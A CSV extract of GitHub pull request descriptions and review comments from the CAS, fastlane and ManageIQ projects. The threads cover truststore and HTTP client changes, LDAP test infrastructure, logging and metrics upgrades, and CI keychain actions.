,gh_project_name,gh_pull_req_num,gh_pr_original_comment,gh_comments
10,Jasig/cas,601.0,"This pull fixes https://github.com/Jasig/cas/issues/472

## Description
CAS currently uses the JDK's default truststore to establish ssh handshakes specially for proxy calls. This can be improved by providing a CAS specific truststore, that would be empty by default. Untrusted proxies can be imported inside this particular store. Separating the store from Java's default always helps with platform upgrades that may cause prev changes to be overwritten.

Note that the default keystore would possibly be used in addition to the already available certs in Java. We simply just want to avoid polluting the default,and allow adopters to carry over their store, irrelevant of jdk version.

## Background
This is proposed under SEC_5:
https://wiki.jasig.org/display/CAS/Proposals+to+mitigate+security+risks

## How does it work?
CAS ships with an empty JKS keystore that is called `truststore.jks` whose password is `changeit` modeled after the default truststore. 

This truststore is loaded by a custom SSL socket factory that is able to realize self-signed certs as well as other imported authorities into the keystore:

```xml
<bean id=""proxyTrustStoreSocketFactory""
          class=""org.jasig.cas.authentication.TrustedProxyAuthenticationTrustStoreSslSocketFactory""
          c:trustStoreFile=""${proxy.authn.truststore.file:classpath:truststore.jks}""
          c:trustStorePassword=""${proxy.authn.truststore.psw:changeit}"" />
```

Then, we have a special httpclient, that is backed by apache http-components, to use the factory above:

```xml
<bean id=""trustStoreProxyHttpClient"" parent=""httpClient""
          c:sslSocketFactory-ref=""proxyTrustStoreSocketFactory"" />
```

## Why Apache Http Components?
We were making changes to HttpClient and @serac suggested that we should at some point consider taking advantage of the apache library. Provides a lot of other options and wraps the Java API quite well. It is a prominent and well looked-after library and sort of a standard tool in the Java realm.

The existing `SimpleHttpClient` that is backed by library now provides a lot of other integration hooks, for handling redirects, connection and proxy management as well as ability to authenticate an endpoint. All these  settings are optional, and the outer body of the API does not  change, only that some setters are deprecated. ","['We want to ship with a completely empty trust store and require deployers to set one up? (and also require deployers who have already gone through the pain of configuring their existing one to do something to get their existing one to continue to work?)\r\n\r\nAlso is the HttpClient change required for this?  If not, why are the two changes tied together?  For example, I have no problem switching to HttpClient, but I would hesitate to do something that is basically forcing people to reconfigure their existing set up.', '>We want to ship with a completely empty trust store and require deployers to set one up? (and also require deployers who have already gone through the pain of configuring their existing one to do something to get their existing one to continue to work?)\r\n\r\nNot quite. Deployers who have already been dealing with the default java truststore will continue to do just fine. The SSL factory recognizes both the default truststore and the local one that would be shipped with CAS. The local truststore simply just exposes a level of flexibility so that the changes upon a java upgrade would not be lost. The truststore can be carried over from one upgrade to the next.  There was discussion on the AppSec group that CAS should perhaps only rely on the local truststore, but that breaks existing deployments as you notes. So at this point, we would just be accommodating both stores but would recommend that self signed certs, etc be imported into the local truststore.', "">Also is the HttpClient change required for this? If not, why are the two changes tied together? For example, I have no problem switching to HttpClient, but I would hesitate to do something that is basically forcing people to reconfigure their existing set up.\r\n\r\nIt is required, yes. Evidently, It's the component that reaches out to an ssl endpoint to establish proxy authn so it needs to be connected with an ssl factory that is able to recognize that endpoint, one that is able to both look the default and the local-CAS truststore. Now, we could have just made the changes I suppose with the existing httpclient without apache. I paused there, because the apache component already handles this sort of thing very well, (see the ssl factory in this PR) and it's an improvement at minimum cost that provides better control and options when establishing a connection. There are no breaking API changes as far as I can tell, save a few setters that are deprecated."", ""Also, to clarify adopters are not expected to set anything up forcefully. The truststore that is shipped here is ready to go; it's simply empty/ready for adopters to start [from now on] importing into it, just like they would have been with the default truststore. As I said, it would have been a breaking change if the config was just limited to the local CAS truststore but that is not the case here. (May become the case in the future to really lock down the config to CAS only)"", 'Another advantage of this method is that the truststore, since it is now part of CAS, can be kept and managed with the overlay, and even be checked into SCM along with the rest of the config. ', 'I have several comments, even if I like the overall idea of having a specific truststore for proxy calls and using the httpclient component from Apache...', '""Not quite. Deployers who have already been dealing with the default java truststore will continue to do just fine. The SSL factory recognizes both the default truststore and the local one that would be shipped with CAS.""\r\n\r\nAhh that wasn\'t quite clear from the original description when I first read it (reading it again with your additional context makes it more clear).  We should be sure that its clear in our documentation.\r\n\r\nI\'ll review this now from the perspective of additive rather than replacement :-)', ""Very cool. Thanks!\r\n\r\nI'll start to address comments by @leleuj in the meanwhile and in the coming days. "", 'Latest commit addresses feedback by @leleuj ', 'Looks like there is an issue in the executor pool initialization...', '+1', 'bump', '+1', 'Merged PR with master once, fixed a few CS and docs issues. Will proceed with the actual merge in a little bit. Thanks for comments. ']"
11,Jasig/cas,718.0,"Deals with https://github.com/Jasig/cas/issues/660

This pull enables ldap tests to execute against an in-memory ldap server backed by UnboundID. The server is first initialized with a common schema, and some CAS-specific objectclasses are registered. Sample LDIF data is then imported into server which primarily drives the tests. The server is restarted per each test class.

I have had to haul the existing ldap tests to somewhat get them functional with unboundid. Hopefully, the presented structure allows one to easily add/remove tests and to observe CAS-specific behavior, with less focus and attention on ldaptive config itself. Most beans are condensed into a single context file that is shared across test classes. 

The sample data that is imported is mostly designed to get tests working, again with focus on CAS functionality while allowing (and assuming) that ldaptive would handle directory-specific changes, configuration and various schemas. 

Probably, the one class that is most impacted by this pull is the ldap-based service registry that is also tested more heavily than others, in view of the recent changes that were made to the CAS service model. There are small changes here and there, but  the most significant one is probably the addition of the objectclass ""top"" to the ldap entry that contains the CAS service. 

I'll try to highlight other changes as well throughout the pull.","[""First, thanks for taking this on -- we've needed this capability for LDAP component test coverage for years. I'll try to review thoughtfully and provide feedback in the next week."", 'Thanks very much for the through feedback. I have accounted for all instances in the latest commit (which also takes care of test failures on Travis by having changed ports). Do let me know if there is more I can work on here. ', 'Will take a closer look at the end of week.', '+1 with a few questions/comments', 'Thanks. I removed the unneeded props and introduced the temp variable. ', ""Enthusiastically +1. Thanks for taking on this grunt work! I'm confident it will pay off in the long run.""]"
12,Jasig/cas,870.0,"Handles https://github.com/Jasig/cas/issues/863 and https://github.com/Jasig/cas/issues/485

## Scope
This is a fairly large pull, but the majority of changes are related to configuration. I'll highlight some of the significant changes that have gone in:

- Upgrade from log4j v1 to log4j v2
- Removal of perf4j and use of dropwizard's metrics (https://dropwizard.github.io/metrics)
- Inclusion of additional metrics and stats into the CAS statistics
- Fixes to log statements and controllers that deal with stats in general

### Upgrade
Log4j v2 is not as easily configurable by Spring. Instead of the previous method invoker for log4j v1, there is now a `CasLoggerContextInitializer` that scans the classpath for the log4j context initializer and starts it for the log configuration file. [I explored all other options. None were better] The log4j auto initialization feature is disabled.

All logging configuration is converted to log4j v2's syntax and format. All log data and configuration should have been preserved.

### Statistics

I had to remove perf4j entirely, because none of the appenders are compatible. Instead, I used dropwizard's various metrics and annotated the appropriate classes with timers and metrics. There is a new metricsConfiguration.xml file that handles all of that via Spring. 

Stats data includes JVM info and is exposed via JMX as well. 

There are several new stats on the /statistics endpoint that output metrics, thread dumps and active sso sessions. These are all, just as before, secured via spring security and simply output JSON data. Links are provided on the statistics JSP page.

The statistics and status controllers were also converted to use annotations instead to help with autowiring of the configuration.

### Others
Various other fixes that relate to logging, such as typos, duplicate and double logging and etc are also applied. ","['It seems that previous log4j configuration were changed when updating to log4j: is this the expected change?\r\nThe SSO session report mechanism should not be in this PR.\r\n', 'Yes it has definitely changed. Config is not backwards compatible and is \r\nmandatory. It\xe2\x80\x99s a major change. While there are component that can route \r\ncalls from log4j v1 to log4j v2, there is nothing that would understand the \r\nconfiguration of log4j v1 and make it work with the v2 syntax. So this is \r\ndone on purpose.\r\n\r\nThe SSO sessions fits with the changes to the statistics. It\xe2\x80\x99s just another \r\nmetric and I realized we could possibly fit it here, as it\xe2\x80\x99s often also \r\nrequested. If that is too much for this pull, I can certainly take it out.\r\n\r\n', 'Took out the SSO report', 'Moving to merge by next Monday morning, unless there are other comments. ', ""Assuming the changes are ok here, I'll proceed with the merge towards this weekend. Please speak up if you see an issue with this plan.""]"
13,Jasig/cas,962.0,"This pull handles #497 

Many thanks to @seanrbaker for bringing this forward. 

The pull contains a set of webflow actions that try to decide if SPNEGO should be activated for the given request. These strategies are per IP, HostName or a given LDAP attribute. If an IP match is found, or a hostname match is found, or an LDAP attribute is found, the action will produce ""yes"" allowing the flow to resume to SPNEGO. ","[""I don't know SPNEGO, but I have a few questions / comments..."", 'I updated the pull based on the discussion on this thread.', ""Moving ahead with this PR. @seanrbaker is there anything else you'd rather see here? "", ""I'm sure there'll be more good ideas as this gets moved into production elsewhere, but this looks good to me!"", '@seanrbaker thanks. Assuming and once this pull merges in, would you be able to help with the documentation? I can always assist where needed.', ""I'm sure I'm going to need help with style and syntax, but otherwise sure thing!""]"
14,KrauseFx/fastlane,78.0,"Added new [gcovr](http://gcovr.com/) code coverage generation action w/ spec.

This action supports all available gcovr CLI args:

```ruby
object_directory: '--object-directory',
output: '-o',
keep: '-k',
delete: '-d',
filter: '-f',
exclude: '-e',
gcov_filter: '--gcov-filter',
gcov_exclude: '--gcov-exclude',
root: '-r',
xml: '-x',
xml_pretty: '--xml-pretty',
html: '--html',
html_details: '--html-details',
html_absolute_paths: '--html-absolute-paths',
branches: '-b',
sort_uncovered: '-u',
sort_percentage: '-p',
gcov_executable: '--gcov-executable',
exclude_unreachable_branches: '--exclude-unreachable-branches',
use_gcov_files: '-g',
print_summary: '-s'
```

Usage Example:
```ruby
lane :test do
  # Run tests
  xctool :test

  # Create code coverage report directory, if it doesn't already exist
  sh ""mkdir -p code-coverage""

  # Generate HTML code coverage
  gcovr({
    html: true,
    html_details: true,
    output: ""./code-coverage/code-coverage-report.html""
  })
end
```

The above test lane is being used by me currently to run tests and generate HTML code coverage reports.
","['This looks really great, thanks for working on this :+1: \r\n\r\nHow about automatically creating the folder if necessary? \r\n\r\nCould you also update the README to explain how to use it (just a few lines, to not clutter the README)\r\n\r\nThanks! ', 'Will do!\n\nThis is a great project. I\xe2\x80\x99m happy to contribute to it. -d\n\n--\xc2\xa0\nDan Trenz\n\nOn February 26, 2015 at 3:52:38 PM, Felix Krause (notifications@github.com) wrote:\n\nThis looks really great, thanks for working on this  \n\nHow about automatically creating the folder if necessary?\n\nCould you also update the README to explain how to use it (just a few lines, to not clutter the README)\n\nThanks!\n\n\xe2\x80\x94\nReply to this email directly or view it on GitHub.\n\n', 'Looks great, thanks for also adding a unit test for it :+1: ', 'This will be in the next release, thanks! :smiley: ']"
15,KrauseFx/fastlane,380.0,"I add actions for signing in CircleCI/TravisCI.

# Usage
```ruby
# I set this ENVs in CircleCI Environment variables 
ENV['KEYCHAIN_NAME'] = ""ios-build.keychain""
ENV['KEYCHAIN_PASSWORD'] = ""very_important_password!""

create_keychain(
  default_keychain: true,
  unlock: true,
  timeout: 3600,
  lock_when_sleeps: true
)
import_certificate certificate_path: ""certs/AppleWWDRCA.cer""
import_certificate certificate_path: ""certs/dist.p12"", certificate_password: ENV['MY_DIST_CERT_PASSWORD']
```

# Could you help me
sh method in `actions_helper.rb` is output args.
But that behavior is not good for sensitive data

this is `import_certificate` action log.

```
[21:57:43]: --------------------------------
[21:57:43]: --- Step: import_certificate ---
[21:57:43]: --------------------------------
[21:57:43]: [SHELL COMMAND]: security import certs/dist.p12 -k ~/Library/Keychains/ios-build.keychain -P very_important_password! -T /usr/bin/codesign
[21:57:43]: [SHELL]: 1 identity imported.
```

that output my `very_important_password!` in shell.
I don't want to output my passowrd.

Do you have something idea or best way?","['I will test for this actions :sunglasses: ', '@gin0606 thank you for submitting this pull request :+1: \r\n\r\nCould you show me an example usage on how you would use this new integration?\r\n\r\nThanks :smiley: ', '@KrauseFx \r\n```ruby\r\ndesc ""Submit a new Inhouse Build to Deploygate""\r\nlane :inhouse do\r\n  create_keychain(\r\n    default_keychain: true,\r\n    unlock: true,\r\n    timeout: 3600,\r\n    lock_when_sleeps: true\r\n  )\r\n  import_certificate certificate_path: ""certs/AppleWWDRCA.cer""\r\n  import_certificate certificate_path: ""certs/dist.p12"", certificate_password: ENV[\'CERT_PASSWORD\']\r\n  sigh(\r\n    app_identifier: ""my.app.identifier"",\r\n    team_id: ""XXXXXXXXXX"",\r\n    adhoc: true,\r\n  )\r\n  ipa(\r\n    scheme: ""myapp"",\r\n    configuration: \'Release\',\r\n    embed: ENV[""SIGH_PROFILE_FILE_NAME""],\r\n  )\r\n  deploygate\r\nend\r\n```\r\n\r\nThank you for checking my pull request :smile: \r\nThis is my lane with new actions.\r\nThis actions to use an existing certificate.\r\n\r\n`cert` action create iOS code signing certificates.\r\nBut I can\'t find a way to use an existing certificates.', 'This looks really good! The test coverage is amazing!\r\n\r\nI added some comments: I think we have problems when the password or Keychain name contains `""` or spaces. ', '@KrauseFx Thanks! :smiley: \r\n\r\nbtw I think `actions_helper`s `sh` output is not good for this actions.\r\nPlease check https://github.com/KrauseFx/fastlane/pull/380#issue-91986349 *Could you help me* section :bow: ', ""Oh, you can just use `#{command}` instead of `sh command` and it won't be displayed in the log. "", 'Sorry, I don\'t know what you mean.\r\n\r\n""`#{command}` instead of `sh command`"" means \xe2\x86\x93this? (probably not :confused: )\r\n Would you explain it again? \r\n\r\n```diff\r\n-  sh ""security create-keychain -p #{params[:password].shellescape} #{params[:name].shellescape}""\r\n+  #{""security create-keychain -p #{params[:password].shellescape} #{params[:name].shellescape}""}\r\n```\r\n\r\n', 'Ohhh, sorry, I meant:\r\n\r\n```ruby\r\n`${command}`\r\n```', 'oops, i forgot that syntax :sweat_smile: \r\n\r\nI will use that! thanks a lot!', ""I trid \\`command\\`. But that can't create keychain normality.\r\nI trid to find that cause and resolve that problem but i can't :cry: \r\n\r\nSo I add `Actions.sh` arg for output log. then actions become normality.\r\nWhat do you think this change...? https://github.com/gin0606/fastlane/commit/12ae6ce9261a99ca585bb67d2a4c5de123c553a2"", 'Looks great, thanks again for working on this :+1: :smiley: ', 'Thank you!!! :laughing: ']"
16,ManageIQ/manageiq,158.0,"Ability to set domain properties for the following scenarios

(1) Priority not passed in when creating a new instance, set the priority to be highest priority + 1
(2) Reset the priorities for a ordered array of domain ids, based on the array index
(3) When a domain is deleted squeeze priorities based on (2) ","['@Fryguy @gmcculloug @tinaafitz @h-kataria ', '@gmcculloug \r\nImplemented your suggestions', '@gmcculloug \r\nMade recommended changes', 'Checked commit https://github.com/mkanoor/manageiq/commit/b5d9c413f027bf6c81a41c2adde2b045fc93b6da with rubocop 0.21.0\n2 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '@gmcculloug \r\nFixed alignment of default_value_for']"
17,ManageIQ/manageiq,103.0,"If a similar named method  exists in a
high priority domain that will overlay the existing method.
The usecase for this is a user wants to modify a single method from
the ManageIQ domain to the Customer domain. During resolution the
method from higher priority Customer domain will be used.","['@Fryguy @chessbyte @gmcculloug @tinaafitz ', 'Since Travis is now green, please rebase to ensure that this PR continues to keep our tests passing.', '@gmcculloug \r\nAdded your recommendations', 'Checked commit https://github.com/mkanoor/manageiq/commit/20ad82e47395fb8df4835e88361e5d6823b9af5d with rubocop 0.21.0\n6 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '@Fryguy \r\nImplemented your recommendations', 'Looks good to me @gmcculloug ?']"
18,ManageIQ/manageiq,202.0,"- Added new entry in the appliance console summary screen
to show a new ""External Auth:"" entry indiciating either
""not configured"" or the IPA Server hostname.
- Also showing current external authentication configuration
before giving the option to unconfigure.

Note: diff best viewed/understood while ignoring whitespace via https://github.com/ManageIQ/manageiq/pull/202/files?w=1
","[""Looks good to me.  @abellotti Can you squash these commits? Then we'll let Travis run and it should be good to merge."", ""Done.\r\n\r\nThanks Jason,\r\nAlberto\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nOn Jul 16, 2014, at 4:00 PM, Jason Frey <notifications@github.com> wrote:\r\n\r\n> Looks good to me. @abellotti Can you squash these commits? Then we'll let Travis run and it should be good to merge.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> "", 'Checked commit https://github.com/abellotti/manageiq/commit/1d68accc1937ef7ac623854914e2e299d9e60ef7 with rubocop 0.21.0\n3 files checked, 0 offenses detected\nEverything looks good. :cake:\n']"
19,ManageIQ/manageiq,231.0,"- Added PDFGenerator available check to download PDF button before running show/hide or enable/disable commands on it. This was causing JS error running actions when button is not in toolbars.
- Refactored code that was running JS commands on toolbar buttons to show/hide or enable/disable them.

@dclarizio please review/test. This fix should load timelines successfully when PDF button is hidden in the toolbars. ","['@jrafanie @Fryguy made suggested changes', '@Fryguy please re-review.', ""I'm seeing the session object jump over 400K after generating a timeline and it stays that way after going to other screens.  There is an A/R object in there called report, so perhaps we can get rid of that while we're in this code, maybe move it to a temporary var."", 'Checked commits https://github.com/h-kataria/manageiq/commit/633065132a7072df38716a8ab45dec6c123ffdc9 .. https://github.com/h-kataria/manageiq/commit/3c3fa23370be8bc4d5efdaad8a0e1f058fe7fef0 with rubocop 0.21.0\n1 file checked, 0 offenses detected\nEverything looks good. :cake:\n', 'Verified session object no longer bloated with A/R report object.']"
